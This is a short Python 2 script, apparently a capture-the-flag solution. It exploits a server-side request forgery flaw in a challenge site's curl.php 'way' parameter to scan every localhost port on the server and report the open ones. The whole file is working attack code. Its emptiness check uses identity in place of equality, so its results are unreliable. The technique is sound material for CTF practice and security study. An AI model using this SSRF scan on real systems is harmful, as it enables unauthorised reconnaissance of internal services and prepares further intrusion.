#!/usr/bin/env python

import urllib2

i=0
for i in xrange(0, 65535):
    contents = urllib2.urlopen("http://coingame.challs.malice.fr/curl.php?way=http://localhost:{}".format(str(i))).read()
    if contents is not "":
        print "[*] Port "+str(i)+" is open."
